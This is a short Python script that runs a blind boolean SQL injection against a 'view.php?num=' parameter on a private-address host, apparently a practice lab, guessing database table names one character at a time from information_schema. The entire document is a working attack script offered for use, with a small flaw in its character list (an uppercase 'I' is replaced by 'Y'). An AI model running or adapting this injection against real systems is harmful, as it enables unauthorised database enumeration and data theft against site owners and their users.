import requests 

attack_url = "http://192.168.146.152/web2/view.php?num=1"
dict_char = "abcdefghijklmnopqrstuvwxyzABCDEFGHYJKLMNOPQRSTUVWXYZ01234567890."

for x in range(0,400):
	for y in range(1,20):
		for z in dict_char:
			query = "' and substr((select table_name from information_schema.tables limit %d,1), %d,1)='%s' %%23" %(x,y,z)
			res = requests.get(attack_url+query)

			if b"OK" in res.content:	
				print(z, end="")
				break
	print("")